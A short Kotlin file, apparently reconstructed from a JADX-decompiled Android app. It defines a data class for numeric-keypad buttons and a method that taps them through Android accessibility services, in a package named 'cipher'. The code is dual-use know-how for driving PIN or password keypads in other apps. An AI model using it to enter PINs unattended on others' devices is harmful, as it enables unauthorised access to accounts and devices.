package com.storm.safe.rock.service.modules.cipher

import android.graphics.Rect
import android.view.accessibility.AccessibilityNodeInfo

/**
 * 数字键盘按钮信息。
 *
 * JADX: m71 类 (p000 包)
 * 字段映射:
 *   f58283a0 → digit               (数字 0-9, -1=delete, -2=enter)
 *   f58284a1 → bounds              (屏幕坐标)
 *   f58285a2 → resourceId          (resource ID)
 *   f58286a3 → text                (文本)
 *   f58287a4 → contentDescription  (内容描述)
 *   f58288a5 → node                (AccessibilityNodeInfo)
 */
data class DigitButtonInfo(
    val digit: Int,
    val bounds: Rect,
    val resourceId: String,
    val text: String,
    val contentDescription: String,
    val node: AccessibilityNodeInfo?
) {
    /**
     * 尝试点击该按钮。
     * vendor: m213947a0
     */
    fun click() {
        try {
            node?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        } catch (_: Exception) {}
    }
}
